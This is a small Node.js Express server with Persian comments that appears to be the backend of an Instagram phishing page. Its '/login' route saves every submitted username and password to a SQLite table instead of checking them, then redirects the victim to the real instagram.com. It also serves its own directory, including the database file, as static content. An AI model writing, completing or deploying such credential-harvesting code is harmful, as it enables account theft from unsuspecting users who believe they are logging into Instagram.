const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');
const bcrypt = require('bcrypt');

const app = express();
const port = 3000;

// دیتابیس SQLite
const db = new sqlite3.Database('./users.db', (err) => {
  if(err) console.error(err);
  else console.log('SQLite connected');
});

// جدول کاربران
db.run(`CREATE TABLE IF NOT EXISTS users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT,
  password TEXT
)`);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname))); // index.html

// فرم لاگین
app.post('/login', async (req,res) => {
  const { username, password } = req.body;
  try {
    const hashedPassword = await bcrypt.hash(password,10);
    db.run(
      `INSERT INTO users (username,password) VALUES (?,?)`,
      [username, hashedPassword],
      function(err){
        if(err){
          console.error(err);
          res.send('خطا در ثبت');
        } else {
          res.redirect('https://www.instagram.com');
        }
      }
    );
  } catch(err){
    console.error(err);
    res.send('خطا در پردازش');
  }
});

app.listen(port,()=>{console.log(`Server running at http://localhost:${port}`)});
